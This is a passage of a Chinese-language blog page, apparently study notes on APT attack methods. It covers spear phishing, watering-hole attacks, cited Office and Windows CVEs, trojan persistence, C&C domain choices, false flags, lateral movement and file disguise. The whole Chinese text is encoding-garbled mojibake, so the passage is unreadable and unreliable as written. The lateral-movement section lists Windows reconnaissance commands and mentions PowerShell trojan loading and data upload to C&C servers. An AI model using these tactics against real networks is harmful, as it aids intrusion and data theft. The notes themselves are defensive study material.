·çš„æ”»å‡»æ–¹æ³•åœ¨å›¢é˜Ÿå…¶ä»–æˆå‘˜ä¸­ä¹Ÿç›¸ç»§æˆåŠŸã€‚é’“é±¼é‚®ä»¶ä½¿ç”¨äº†(Bitly)çŸ­é“¾æ¥æŠ€æœ¯æ¥è¿›è¡Œä¼ªè£…ã€‚</li></ul></li><li><p>æ³•å›½æ€»ç»Ÿå¤§é€‰</p><ul><li>æ”»å‡»ç»„ç»‡ï¼šAPT-28<br>æ–‡æ¡£:Trumpâ€™s_Attack_On_Syria_English.docx<br>æ ¸å¿ƒæ”»å‡»æŠ€æœ¯ï¼š<br>CVE-2017-0262(Wordè¿œç¨‹ä»£ç æ‰§è¡Œ)<br>CVE-2017-0263(Windowsæœ¬åœ°æƒé™å‡çº§)</li></ul></li></ul><h3 id="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"><a href="#æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ" class="headerlink" title="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"></a>æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ</h3><ul><li>å›½å†…é¡¶å°–å¤§å­¦ã€ç ”ç©¶é™¢</li><li>å›½å†…æµ·äº‹ã€ç”µä¿¡ã€èƒ½æºã€å›½é˜²ã€å†›å·¥ä¸š</li></ul><h2 id="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"><a href="#APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ" class="headerlink" title="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"></a>APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ</h2><h3 id="APTæ”»å‡»çš„ç›®æ ‡"><a href="#APTæ”»å‡»çš„ç›®æ ‡" class="headerlink" title="APTæ”»å‡»çš„ç›®æ ‡"></a>APTæ”»å‡»çš„ç›®æ ‡</h3><ul><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯</p><ul><li><p>PCæ•æ„Ÿæ–‡ä»¶æ‰©å±•å</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>ç§»åŠ¨ç«¯æ•æ„Ÿæ–‡ä»¶</p><ul><li>éŸ³é¢‘ã€ç…§ç‰‡ã€é€šè¯å½•éŸ³ã€å½•åƒã€é€šè¯è®°å½•ã€é€šè®¯å½•ã€çŸ­ä¿¡ã€æ‰‹æœºåŸºæœ¬ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯</li></ul></li><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯çªƒå–æ–¹å¼</p><ul><li>æ ¸å¿ƒæ€æƒ³ï¼šé€‰æ‹©æ€§çªƒå–ï¼ˆæ”»å‡»è€…å¦‚æœæ´»åŠ¨å¤ªé¢‘ç¹ï¼Œæœ¨é©¬ä¸C&amp;CæœåŠ¡å™¨çš„é€šä¿¡æ¬¡æ•°è¶Šå¤šè¶Šå®¹æ˜“æš´éœ²ï¼‰ã€‚æ•…APTç»„ç»‡ä¸€èˆ¬åªæ”¶é›†ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–è€…æœ‰ç‰¹æ®Šæ–‡ä»¶åçš„æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ç›´æ¥å›ä¼ ã€Socketé€šä¿¡ã€ ç”µå­é‚®ä»¶</li></ul></li></ul></li><li><p>æ•æ„Ÿæ–‡ä»¶</p></li><li><p>ç»æµåˆ©ç›Š</p></li><li><p>æŒç»­ç›‘æ§</p></li><li><p>ç ´å</p></li><li><p>æ”»å‡»ç›®æ ‡å¹³å°</p><ul><li><p>Windowsã€Androidã€MacOSã€iOS</p></li><li><p>è·¨å¹³å°çš„æ°´å‘æ”»å‡»</p><ul><li>å¸¦æœ‰æ¶æ„ç¨‹åºçš„ä¼ªé€ Flashå‡çº§åŒ…</li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"><a href="#APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"></a>APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ</h3><ul><li><p>é±¼å‰æ”»å‡»(Spear Phishing)</p><ul><li><p>ç›®çš„ï¼šä¸é€šè¿‡æˆæƒè®¿é—®æœºå¯†æ•°æ®</p></li><li><p>æ‰‹æ®µï¼šæœ€å¸¸è§çš„æ–¹å¼æ˜¯é€šè¿‡ç”µå­é‚®ä»¶å‘é€ç»™ç‰¹å®šçš„æ”»å‡»ç›®æ ‡ï¼Œè¯±ä½¿ç›®æ ‡æ‰“å¼€é™„ä»¶ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯é±¼å‰é‚®ä»¶ã€‚</p><ul><li>é’“é±¼é‚®ä»¶ï¼šè¿™ä¸ªæ¦‚å¿µå’Œé±¼å‰é‚®ä»¶ç±»ä¼¼ã€‚ä¸è¿‡ï¼Œé’“é±¼å¤šæ˜¯é’ˆå¯¹æ™®é€šäººçš„æ”»å‡»ï¼Œé’ˆå¯¹æ€§è¾ƒå¼±ï¼Œç²¾ç¡®åº¦è¾ƒä½ã€‚</li></ul></li><li><p>å®æ–½è¿‡ç¨‹ï¼šå‰æœŸå‡†å¤‡-&gt;é‚®ä»¶åˆ¶ä½œ-&gt;é‚®ä»¶æŠ•æ”¾-&gt;æƒ…æŠ¥å›æ”¶</p></li><li><p>é˜²æŠ¤æ–¹æ³•ï¼šç¨å¾®æœ‰ç‚¹å®‰å…¨æ„è¯†å³å¯ï¼Œè®¤çœŸæŸ¥çœ‹é‚®ä»¶æ¥æºï¼Œé™„ä»¶æ‰©å±•åï¼Œç—…æ¯’æ‰«æï¼Œè™šæ‹Ÿæœºï¼Œæ²™ç®±ç­‰ã€‚</p></li></ul></li><li><p>æ°´å‘æ”»å‡»(Water Holing)</p><ul><li><p>æ”»å‡»æ¦‚è¿°ï¼šæ”»å‡»è€…é€šè¿‡åˆ†ææ”»å‡»ç›®æ ‡çš„ç½‘ç»œæ´»åŠ¨è§„å¾‹ï¼Œå¯»æ‰¾æ”»å‡»ç›®æ ‡ç»å¸¸è®¿é—®çš„ç½‘ç«™çš„å¼±ç‚¹ï¼Œå…ˆæ”»ä¸‹è¯¥ç«™ç‚¹å¹¶æ¤å…¥æ”»å‡»ç¨‹åºï¼Œåœ¨æ”»å‡»ç›®æ ‡è®¿é—®è¯¥ç«™ç‚¹æ—¶å®æ–½æ”»å‡»</p></li><li><p>ä»¥æµ·è²èŠ±APTç»„ç»‡çš„æ°´å‘æ”»å‡»ä¸¾ä¾‹</p><ul><li><p>Aæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™çš„å¯ä¿¡ç¨‹åº(æ†ç»‘å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨)</li><li>å¯¹ç›®æ ‡ç½‘ç«™æ’å…¥æ¶æ„JavaScriptç¨‹åº(ä¼ªè£…æˆAdobe Flashæ›´æ–°ç¨‹åº)</li></ul></li><li><p>Bæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™ç«™ç‚¹æŒ‡å®šé“¾æ¥</li></ul></li></ul></li></ul></li><li><p>PCè·³æ¿</p></li><li><p>ç¬¬ä¸‰æ–¹å¹³å°</p><ul><li>APTç»„ç»‡é€šè¿‡ç¤¾äº¤ç½‘ç»œæ¥ä¸‹å‘C&amp;CæŒ‡ä»¤ï¼ŒAPTç»„ç»‡çš„ä¸“ç”¨æœ¨é©¬ä¼šè¯»å–æ–‡ç« ä¸­çš„ç¨‹åºæŒ‡ä»¤æ¥å®ŒæˆæŒ‡å®šçš„æ”»å‡»æ“ä½œ</li><li>å¾®åšã€Twitterã€Facebookã€â€¦</li></ul></li><li><p>æ¶æ„ç¡¬ä»¶ä¸­é—´äººåŠ«æŒ</p><ul><li><p>åœ¨ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­éƒ¨ç½²ç‰©ç†ç¡¬ä»¶è®¾å¤‡ï¼Œé€šè¿‡ä¸­é—´äººæ–¹å¼åŠ«æŒç”¨æˆ·ç½‘ç»œæµé‡ï¼Œæ›¿æ¢æ›´æ–°åŒ…ç­‰è½¯ä»¶</p><ul><li>è¾“å…¥æ³•è½¯ä»¶ã€èŠå¤©è½¯ä»¶ã€ä¸‹è½½è½¯ä»¶ã€å½±éŸ³è½¯ä»¶ã€å®‰å…¨è½¯ä»¶ã€å¾®è½¯ç³»ç»Ÿè½¯ä»¶</li></ul></li><li><p>ä¾‹å­ï¼šç«ç„°ç—…æ¯’</p></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"><a href="#APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"></a>APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡</h3><ul><li><p>ä¸“ç”¨æœ¨é©¬</p><ul><li><p>å¼€æœºè‡ªå¯åŠ¨</p><ul><li><p>ä¿®æ”¹å¿«æ·æ–¹å¼</p></li><li><p>DLL(åŠ¨æ€é“¾æ¥åº“)åŠ«æŒ</p></li><li><p>ä¿®æ”¹æ³¨å†Œè¡¨ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡</p></li><li><p>APTç»„ç»‡ä¸ºä½•æ”¾å¼ƒå¼€æœºè‡ªå¯åŠ¨ï¼Ÿ</p><ul><li><p>ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦ä¸€æ¬¡æ€§æ”»å‡»</p><ul><li>ç«åŠ›ä¾¦å¯Ÿåˆ¤æ–­ç›®æ ‡æ˜¯å¦ä¸ºçœŸå®ç›®æ ‡æ—¶ã€ç›®æ ‡é˜²æŠ¤èƒ½åŠ›å¾ˆå¼ºæ—¶ï¼ˆéƒ½æ˜¯ä¸ºäº†éšè—è‡ªå·±çš„æ”»å‡»</li></ul></li><li><p>ä¾èµ–åŸå§‹æ¯ä½“æ–‡ä»¶è¿è¡Œ</p></li><li><p>ç”¨å…¶ä»–æ–¹æ³•å¯åŠ¨æœ¨é©¬</p><ul><li>æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ã€æˆ–è€…æ†ç»‘åˆ°å…¶ä»–è½¯ä»¶</li><li>åˆ©ç”¨æ¼æ´åŠ«æŒç¯¡æ”¹ç½‘ç»œæµé‡</li></ul></li></ul></li></ul></li><li><p>åŠ å¯†ä¸è‡ªåŠ å¯†</p></li><li><p>æœ¨é©¬å‡çº§æ¢ä»£</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>å‡ºäºæ”»å‡»æŠ€æœ¯æˆæœ¬è€ƒè™‘ã€ç›®æ ‡ç³»ç»Ÿå­˜åœ¨å¤§é‡å·²çŸ¥æ¼æ´ä½†æœªä¿®å¤</p></li><li><p>ç›¸å…³ä¾‹å­</p><ul><li><p>CVE-2012-0158</p><ul><li>å¾®è½¯Officeæ¼æ´(éå¸¸ç¨³å®š)ï¼Œè¿œç¨‹æ”»å‡»è€…è¯±ä½¿ç›®æ ‡æ‰“å¼€ä¸€ä¸ªç»è¿‡ç‰¹æ®Šæ„é€ çš„RTFæ–‡ä»¶ï¼Œåœ¨ç¬¦åˆæ¼æ´æ¡ä»¶ä¸‹ï¼Œå³å¯åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚</li></ul></li><li><p>CVE-2015-0097</p><ul><li>å¾®è½¯Officeçš„ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œå¯å¯¼è‡´ç›®æ ‡é€šè¿‡HTAæ–‡ä»¶ä¸‹è½½æ¶æ„ç¨‹åºåˆ°æœ¬æœºå¹¶æ‰§è¡Œ</li></ul></li><li><p>Android æ¼æ´</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office æ–‡æ¡£æ¼æ´</li><li>Windows ææƒæ¼æ´</li><li>Flash æ¼æ´</li><li>å…¶ä»–0day</li></ul></li><li><p>APTç»„ç»‡æ­¦å™¨ä½¿ç”¨æˆæœ¬åŸåˆ™(0dayã€æˆ–è€…æŠ€æœ¯æˆæœ¬è¾ƒé«˜çš„æ”»å‡»æ‰‹æ®µ)</p><ul><li>æ”»å‡»ç›®æ ‡å…·æœ‰è¶³å¤Ÿçš„æ”»å‡»ä»·å€¼</li><li>ä¸€èˆ¬çš„ä¸“ç”¨æœ¨é©¬æ”»å‡»æ— æ•ˆæˆ–è€…æ— æ³•è¾¾åˆ°é¢„æœŸç›®çš„</li><li>åˆ©ç”¨1dayã€ndayæ”»å‡»ä¾ç„¶æ— æ³•è¾¾åˆ°ç›®çš„æˆ–è€…æ— æ•ˆ</li></ul></li><li><p>APTæ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ç‰¹åˆ«å…³æ³¨ç‚¹ï¼šRAT(Remote Access Trojan)æ–‡ä»¶,è¿œç¨‹è®¿é—®æœ¨é©¬çš„æ–‡ä»¶æ ¼å¼ã€æ–‡ä»¶å½¢æ€ã€åŠŸèƒ½å½¢æ€ã€æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®çš„å˜åŒ–</p></li><li><p>ç›¸å…³æ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ä»PEåˆ°éPEï¼Œä»æœ‰å®ä½“åˆ°æ— å®ä½“</p></li><li><p>å°ä¼—ç¼–ç¨‹è¯­è¨€æ—¥æ¸æµè¡Œ(Delphi\GCC\NSIS\AutoIt</p></li><li><p>æ¨¡å—äº’åŠ¨ï¼Œäº‘æ§æŠ€æœ¯æ¸æˆä¸»æµ</p></li><li><p>æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®è¶Šè—è¶Šæ·±ï¼šä»å¸¸è§çš„ç³»ç»Ÿç›®å½•åˆ°éš¾ä»¥è¿½è¸ªçš„MBR, VBR, ç£ç›˜å›ºä»¶, EFI, BIOS, ç§»åŠ¨å­˜å‚¨è®¾å¤‡çš„éšè—åˆ†åŒº</p></li><li><p>ç‹¬ç«‹ç ”å‘ä¸å§”æ‰˜å®šåˆ¶æˆä¸»æµ</p><ul><li>ä½¿ç”¨å…¬å¼€çš„RATï¼Œç›®çš„æ˜¯è‡ªæˆ‘éšè—å’Œå«ç¥¸ä»–äºº</li><li>ç»å¤§éƒ¨åˆ†çš„APTç»„ç»‡éƒ½æ˜¯åœ¨ç›¸å¯¹ç‹¬ç«‹çš„ç¯å¢ƒä¸‹å®Œæˆæ”»å‡»ä»£ç çš„å¼€å‘å·¥ä½œ</li><li>ä¸æ’é™¤å§”æ‰˜ç¬¬ä¸‰æ–¹ç»„æˆååŠ©å®šåˆ¶å¼€å‘çš„å¯èƒ½æ€§</li></ul></li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„-C-amp-C-Command-and-Control"><a href="#APTæ”»å‡»çš„-C-amp-C-Command-and-Control" class="headerlink" title="APTæ”»å‡»çš„ C&amp;C(Command and Control)"></a>APTæ”»å‡»çš„ C&amp;C(Command and Control)</h3><ul><li>ä¸»è¦ä½œç”¨ï¼š</li></ul><p>1.å‘æ„ŸæŸ“äº†ç›®æ ‡æœºçš„æœ¨é©¬ç¨‹åºå‘é€æ§åˆ¶å‘½ä»¤ï¼Œæä¾›ä¸‹è½½èµ„æº(æ–°æœ¨é©¬ï¼Œæœ¨é©¬æ¨¡å—ï¼Œé…ç½®æ–‡ä»¶ç­‰)<br>2.å›æ”¶æœ¨é©¬ç¨‹åºæ”¶é›†åˆ°çš„æƒ…æŠ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€é‚®ä»¶ç­‰</p><ul><li><p>åœ°åŸŸåˆ†å¸ƒ</p><ul><li><p>ç¾å›½æœ€å¤šã€å…¶æ¬¡ä¸­å›½ã€ä¿„ç½—æ–¯ï¼Œè¥¿ç­ç‰™ï¼Œå¾·å›½å¹¶åˆ—ç¬¬ä¸‰(2015å¹´)</p><ul><li>ä¸€ä¸ªAPTç»„ç»‡å¯èƒ½æ‹¥æœ‰æ•°åä¸ªï¼Œæˆ–è€…å‡ ä¸ªåˆ†å¸ƒäºä¸åŒåœ°åŸŸçš„C&amp;CæœåŠ¡å™¨</li></ul></li></ul></li><li><p>æ³¨å†Œæœºæ„</p><ul><li><p>å›½å†…å¤–APTç»„ç»‡å‡ä½¿ç”¨æˆ–éƒ¨åˆ†ä½¿ç”¨å¢ƒå¤–æœåŠ¡å•†åŠ¨æ€åŸŸåï¼ŒChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>åŠ¨æ€åŸŸåçš„å¥½å¤„ï¼š</li></ul></li></ul></li></ul><p>1.ç›¸å…³æ³¨å†Œä¿¡æ¯ä¸å¯¹å¤–å…¬å¼€(æ— whoisä¿¡æ¯)<br>2.éœ€è¦åŸŸåæŒæœ‰è€…çš„æƒé™æ‰èƒ½æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</p><ul><li><p>æ³¨å†Œåå¥½</p><ul><li><p>æ¨¡ä»¿é‚®ç®±ç±»</p><ul><li>126mailserver ã€mail163ç­‰</li></ul></li><li><p>æ¨¡ä»¿æ€æ¯’è½¯ä»¶ç±»</p><ul><li>safe360ã€risingç­‰</li></ul></li><li><p>æ¨¡ä»¿äº’è”ç½‘å…¬å¸ç±»</p><ul><li>360sc2ã€sohuã€sogouã€sinaç­‰</li></ul></li></ul></li></ul><h2 id="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"><a href="#APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ" class="headerlink" title="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"></a>APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ</h2><h3 id="æƒ…æŠ¥æ”¶é›†"><a href="#æƒ…æŠ¥æ”¶é›†" class="headerlink" title="æƒ…æŠ¥æ”¶é›†"></a>æƒ…æŠ¥æ”¶é›†</h3><ul><li><p>é‡è¦æ€§ï¼šAPTç»„ç»‡å‘åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½ä¼šæ¶ˆè€—åœ¨æƒ…æŠ¥æ”¶é›†ç¯èŠ‚ä¸Šã€‚ä¸ºäº†è¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œæ”»å‡»è€…å¿…é¡»å°½å¯èƒ½åœ°å…¨é¢çš„æ”¶é›†æ”»å‡»ç›®æ ‡ç›¸å…³çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»è®¤çŸ¥æ°´å¹³åˆ°æŒæ¡æ°´å¹³ã€‚</p></li><li><p>å…¬å¼€æƒ…æŠ¥æ”¶é›†</p><ul><li>å®˜æ–¹ç½‘ç«™ã€è¡Œä¸šç½‘ç«™ã€å­¦æœ¯æœŸåˆŠã€è¡Œä¸šä¼šè®®ã€æ–°é—»æŠ¥é“ç­‰</li></ul></li><li><p>åœ°ä¸‹æƒ…æŠ¥æ”¶é›†</p><ul><li>åœ°ä¸‹é»‘å¸‚è´­ä¹°ç¤¾å·¥åº“</li><li>å…¥ä¾µç¬¬ä¸‰æ–¹ç½‘ç«™ä»¥è·å–ç›®æ ‡äººå‘˜ã€ç»„ç»‡çš„æƒ…æŠ¥ä¿¡æ¯</li><li>å‘å…¶ä»–APTç»„ç»‡è´­ä¹°æƒ…æŠ¥ä¿¡æ¯</li></ul></li></ul><h3 id="ç«åŠ›ä¾¦å¯Ÿ"><a href="#ç«åŠ›ä¾¦å¯Ÿ" class="headerlink" title="ç«åŠ›ä¾¦å¯Ÿ"></a>ç«åŠ›ä¾¦å¯Ÿ</h3><ul><li>ç›®çš„ï¼šæ”¶é›†æ”»å‡»ç›®æ ‡ç½‘ç»œæˆ–è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€åˆ¤æ–­æ”»å‡»ç›®æ ‡çš„çœŸä¼ª(æ˜¯å¦ä¸ºè™šæ‹Ÿæœº)ã€é˜²å¾¡èƒ½åŠ›ã€æ”»å‡»ä»·å€¼ã€‚ä»¥åŠæ–¹ä¾¿åæœŸæ¨ªå‘ç§»åŠ¨çš„å‡†ç¡®æ€§ã€‚</li><li>ä¸»æœºä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä¸»æœºåç§°ã€æœ¬åœ°ç”¨æˆ·åç­‰</li><li>ç½‘ç»œä¿¡æ¯ï¼šä¸»è¦æ˜¯IPåœ°å€ã€ç½‘å…³ä¿¡æ¯</li><li>åº”ç”¨ç¨‹åºä¿¡æ¯åŠç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¾®è½¯Officeã€å¾®è½¯Internet Explorer</li><li>ç£ç›˜ä¿¡æ¯ã€å½“å‰è¿›ç¨‹ä¿¡æ¯ç­‰</li></ul><h3 id="ä¾›åº”é“¾æ”»å‡»"><a href="#ä¾›åº”é“¾æ”»å‡»" class="headerlink" title="ä¾›åº”é“¾æ”»å‡»"></a>ä¾›åº”é“¾æ”»å‡»</h3><ul><li><p>æ”»å‡»åŸç†</p><ul><li>å½“æ”»å‡»ç›®æ ‡æœ¬èº«çš„é˜²å¾¡æªæ–½ç‰¹åˆ«å®Œå–„æ—¶ï¼Œæˆ–åˆå§‹æ”»å‡»æ— æ³•è¾¾åˆ°æ•ˆæœï¼Œå¯¹ç›®æ ‡ç›¸å…³çš„å‘¨è¾¹ä¼ä¸šã€äººå‘˜ã€ä¾›åº”é“¾è¿›è¡Œæ”»å‡»ï¼Œæœ‰å¯èƒ½å–å¾—è¾ƒå¥½çš„æ•ˆæœã€‚</li></ul></li><li><p>å…¸å‹æ¡ˆä¾‹</p><ul><li>éœ‡ç½‘ç—…æ¯’ã€Havex</li></ul></li></ul><h3 id="å‡æ——è¡ŒåŠ¨"><a href="#å‡æ——è¡ŒåŠ¨" class="headerlink" title="å‡æ——è¡ŒåŠ¨"></a>å‡æ——è¡ŒåŠ¨</h3><ul><li><p>æ¦‚è¿°</p><ul><li><p>ä¹Ÿå«ä¼ªæ——è¡ŒåŠ¨ï¼Œæ˜¯éšè”½è¡ŒåŠ¨çš„ä¸€ç§ã€‚é€šè¿‡ä½¿ç”¨å…¶ä»–ç»„ç»‡çš„æ——å¸œã€åˆ¶æœç­‰æ‰‹æ®µè¯¯å¯¼å…¬ä¼—ã€ä½¿å…¬ä¼—è®¤ä¸ºè¯¥æ”»å‡»æ˜¯å…¶ä»–æ”»å‡»ç»„ç»‡æ‰§è¡Œã€‚</p><ul><li>ç›¸å…³æˆ˜æœ¯æœ¯è¯­ï¼šæ‹Ÿæ€ã€è¯±é¥µã€æ··æ·†ã€ä¼ªè£…ã€å¹²æ‰°</li></ul></li></ul></li><li><p>ç±»å‹</p><ul><li><p>é¢„è®¾é™·é˜±</p><ul><li>æ ·æœ¬æ–‡ä»¶ã€C&amp;CæœåŠ¡å™¨åŸŸåã€ç‰¹æ®Šå­—ç¬¦ä¸²ã€ä¸Šçº¿å¯†ç ã€è¯±é¥µæ–‡æ¡£å±æ€§ä¿¡æ¯ç­‰</li></ul></li><li><p>äº‹åæ©ç›–</p><ul><li>æ”»å‡»æˆåŠŸåï¼Œå¯¹åŸŸåwhoisã€IPåœ°å€ç­‰ä¿¡æ¯è¿›è¡Œä¼ªè£…</li></ul></li></ul></li><li><p>å†’å……å¯¹è±¡</p><ul><li>å†’å……å…¶ä»–APTç»„ç»‡</li><li>å†’å……æ™®é€šç”¨æˆ·</li></ul></li><li><p>å›½å®¶çº§æƒ…æŠ¥æœºæ„å¯¹è¯¥è¡ŒåŠ¨çš„è§‚ç‚¹</p><ul><li><p>äº”çœ¼è”ç›Ÿ</p><ul><li>ä¸æ¬ºéª—ç›¸å…³çš„ç­–ç•¥ï¼šæš—åŒº(DarkSpace)ã€èœœç½(Honeypot)ã€èœœä»¤(Honeytoken)ã€èœœç½‘(Honeynet)ã€å‡æ——è¡ŒåŠ¨(False Flag)ã€æ•ˆæœ(Effects)</li></ul></li><li><p>äº”çœ¼è”ç›Ÿå¯¹å‡æ——è¡ŒåŠ¨çš„è§‚ç‚¹ï¼š1.æœ‰æ„åˆ¶é€ æ”»å‡»ç›®æ ‡ä¸è¢«å«ç¥¸å›½æˆ–ç»„ç»‡é—´ç´§å¼ çš„æ•Œå¯¹æ°”æ°›ï¼Œä»¥å®ç°æŸç§æ”¿æ²»æˆ–ç»æµç›®çš„ 2.æ›´å¥½åœ°éšè—è‡ªå·±ï¼Œé¿å…æš´éœ²ï¼Œæ”¶è·æ›´å¤§åˆ©ç›Šã€‚</p></li></ul></li></ul><h3 id="å‘¨æœŸæ€§è¢­æ‰°"><a href="#å‘¨æœŸæ€§è¢­æ‰°" class="headerlink" title="å‘¨æœŸæ€§è¢­æ‰°"></a>å‘¨æœŸæ€§è¢­æ‰°</h3><ul><li>å‘¨ä¸€ã€äºŒï¼ˆå·¥ä½œæ—¥å¤„ç†é‚®ä»¶ã€æ–‡ä»¶é«˜å³°æœŸï¼‰</li><li>å¤§å‹èŠ‚æ—¥ï¼ˆå¦‚å›½åº†èŠ‚ã€æ˜¥èŠ‚ç­‰ï¼‰</li></ul><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>ç›®çš„ï¼š</li></ul><p>1.è¿›ä¸€æ­¥åœ¨æ„ŸæŸ“çš„ç›®æ ‡æœºå™¨ä¸Šè·å–æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯<br>2. å€ŸåŠ©å—æ„ŸæŸ“çš„æœºå™¨ï¼Œæ¢æµ‹å‘¨è¾¹å…¶ä»–è®¾å¤‡çš„æƒ…å†µæˆ–ç›´æ¥å‘å‘¨è¾¹è®¾å¤‡å‘åŠ¨æ”»å‡»</p><ul><li><p>æ¨ªå‘ç§»åŠ¨æ”»å‡»æ­¥éª¤</p><ul><li>ä¾¦å¯Ÿå’Œè¯†åˆ«ç½‘ç»œæ‹“æ‰‘ã€è·å–åŸŸè®¡ç®—æœºä¿¡æ¯ã€å½“å‰è®¡ç®—æœºç›¸å…³ä¸»æœºä¿¡æ¯ã€ç½‘å¡ä¿¡æ¯ã€è·¯ç”±ä¿¡æ¯ç­‰</li><li>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºæœåŠ¡åŠçŠ¶æ€ã€è·å–æŒ‡å®šIPå…±äº«ä¿¡æ¯ã€å…±äº«ç›®å½•ã€æ‰«æå†…ç½‘æœºå™¨è¿œç¨‹ç«¯å£ç­‰</li><li>è¡¥å……åŸæœ‰æœ¨é©¬æ²¡æœ‰çš„åŠŸèƒ½ã€çªƒå–æœ¬æœºæ›´å¤šä¿¡æ¯ã€å‘å‘¨è¾¹å…¶ä»–è®¾å¤‡å‘åŠ¨æ”»å‡»</li><li>å¸¸ç”¨å‘½ä»¤ï¼šnet viewã€ipconfig /allã€netstat -a/nã€nbstat -Aã€systeminfoã€tracert -w 1000 8.8.8.8ã€pingã€telnetã€åˆ©ç”¨PowerShellè¿œç¨‹åŠ è½½æœ¨é©¬æˆ–è€…ä¸Šä¼ æƒ…æŠ¥ä¿¡æ¯åˆ°C&amp;CæœåŠ¡å™¨</li></ul></li></ul><h3 id="ä¼ªè£…æœ¯"><a href="#ä¼ªè£…æœ¯" class="headerlink" title="ä¼ªè£…æœ¯"></a>ä¼ªè£…æœ¯</h3><ul><li><p>ç¤¾ä¼šå·¥ç¨‹å­¦ä¼ªè£…</p><ul><li>é‚®ä»¶å†…å®¹ä¼ªè£…</li><li>é‚®ä»¶èº«ä»½ä¼ªè£…</li></ul></li><li><p>æ–‡ä»¶è§†è§‰ä¼ªè£…</p><ul><li>æ–‡ä»¶å</li><li>æ–‡ä»¶æ‰©å±•å</li><li>æ–‡ä»¶å›¾æ ‡</li></ul></li><li><p>å¿«æ·æ–¹å¼ä¼ªè£…</p><ul><li>å°†æ”»å‡»ä»£ç æ–‡ä»¶å’Œä¸€ä¸ªæŒ‡å‘æ”»å‡»ä»£ç çš„å¿«æ·æ–¹å¼æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒæ—¶ï¼Œå¿«æ·æ–¹å¼çš„å‘½åå…·æœ‰è¿·æƒ‘æ€§</li></ul></li><li><p>æ†ç»‘åˆæ³•ç¨‹åº</p><ul><li><p>AWVS7</p><ul><li>é’ˆå¯¹ç½‘ç»œå®‰å…¨è¡Œä¸š</li></ul></li><li><p>åŠå…¬è½¯ä»¶</p><ul><li>æ”¿åºœå•ä½ã€äº‹ä¸šå•ä½</li></ul></li><li><p>å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨</p><ul><li>æ”¿åºœæœºæ„</li></ul></li><li><p>å¾®è½¯æ›´æ–°ç¨‹åº</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>å‹ç¼©åŒ…å¤–å£³</p><ul><li>å°†æœ¨é©¬ç¨‹åºè¿›è¡Œå‹ç¼©ï¼Œä»¥å‹ç¼©åŒ…çš„å½¢å¼ä¼ æ’­</li></ul></li></ul><h3 id="åä¾¦å¯Ÿæœ¯"><a href="#åä¾¦å¯Ÿæœ¯" class="headerlink" 